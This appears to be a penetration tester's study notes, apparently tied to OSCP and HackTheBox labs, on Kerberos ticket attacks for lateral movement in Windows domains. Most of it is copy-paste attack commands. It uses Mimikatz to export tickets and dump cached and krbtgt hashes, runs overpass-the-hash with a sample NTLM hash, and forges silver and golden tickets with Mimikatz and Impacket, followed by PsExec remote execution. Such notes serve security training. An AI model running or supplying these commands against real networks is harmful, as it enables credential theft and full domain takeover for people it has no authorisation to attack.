# Ticket Attacks- Lateral Movement

## Mimikatz Dump tickets into a file

This saves the tickets you see in `klist` into a `.kirbi` file.

```bash
invoke-mimikatz -command '"sekurlsa::tickets /export"'
invoke-mimikatz -command '"kerberos::list /export"'
```

You can rename the file with the regex “*” before transferring

![Untitled](Ticket%20Attacks-%20Lateral%20Movement%20bc869d1597a84fc4882ab9634ce29afa/Untitled.png)

# Overpass the hash

> With overpass the hash, we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket
Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
> 

Can see more about this in pen-200 pdf page 656.

```nasm
// show ntlm hash of users with cached credentials
mimikatz # sekurlsa::logonpasswords

// pass the hash with jeff_admin's hash and open a new powershell session as jeff_admin
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com
/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

// generate a TGT by authenticating to a network share in jeff_admin's powershell session
// note: We used “net use” arbitrarily in this example but we could have used any command that requires domain permissions and would subsequently create a TGS.
net use \\dc01
```

Now that you have the Kerberos TGT loaded, you can run psexec

```nasm
.\PsExec.exe \\dc01 cmd.exe
```

Overpass the hash is viable when NTLM authentication isn’t allowed in the domain. In this case, you can leverage the kerberos tickets to gain access. When NTLM is enabled, however, it’s probably easier to just use a typical PTH attack.

************Note: You may be able to use Rubeus to dump the generated ticket in base64 format so that you can convert it on your host machine to `.ccache` and use it to remotely pass the ticket.*

# Silver Ticket Attack

Services like mssql are vulnerable to Silver Ticket Attacks. In this example, you would generate the silver ticket, and then access mssql through impacket like so:

```nasm
impacket-mssql dc1.scrm.local -k
```

Ippsec shows how to do this [here](https://youtu.be/_8FE3JZIPfo?t=1093) 

### NTLM hash required

The silver tickets must always be encrypted with an NTLM hash, so make sure you have that or generated it from the plaintext password from a website on the internet

### Domain SID required

Easiest way to get domain SID is to look at a user SID since the domain SID is the prefix to a user SID.

If the user SID is this `S-1-5-21-1602875587-2787523311-2599479668-1103`, then the domain SID is the same thing minux the `-1103` at the end (the RID). So the domain SID becomes `S-1-5-21-1602875587-2787523311-2599479668`

Alternatively, you can use impacket to do this

```nasm
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
```

### Generate ticket with impacket

To generate the ticket with impacket

```nasm
impacket-ticketer -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b89d17ec7f2e2a68668f04 -domain-sid S-1-5-21-1602875587-2787523311-2599479668 -domain scrm.local

export KRB5CCNAME=Administrator.ccache
```

note: the SPN is of the user sqlsvc on scrambled, HTB.

### Generate ticket with mimikatz

You can optionally clear out prexisting tickets

```nasm
mimikatz # kerberos::purge
mimikatz # kerberos::list
```

Then generate the silver ticket

```nasm
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-160285587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP
```

a new service ticket for the SPN
HTTP/CorpWebServer.corp.com has been loaded into memory and Mimikatz set appropriate
group membership permissions in the forged ticket

# Golden ticket

First, get the hash of the krbtgt

```bash
invoke-mimikatz -command '"privilege::debug" "lsadump::lsa /patch"'
```

![Untitled](Ticket%20Attacks-%20Lateral%20Movement%20bc869d1597a84fc4882ab9634ce29afa/Untitled%201.png)

then, clear the existing tickets and make your golden ticket

```bash
invoke-mimikatz -command '"privilege::debug" "kerberos::purge" "kerberos::golden /user:fakeuser /domain:heist.offsec /sid:S-1-5-21-537427935-490066102-1511301751 /krbtgt:3198641a390fccf87a72629f8fd1bd37 /ptt"'
```

![Untitled](Ticket%20Attacks-%20Lateral%20Movement%20bc869d1597a84fc4882ab9634ce29afa/Untitled%202.png)

## Ptt

```bash
impacket-ticketConverter fakeuser.kirbi fakeuser.ccache
export KRB5CCNAME=`pwd`/fakeuser.ccache
klist # you should see the ticket listed here
```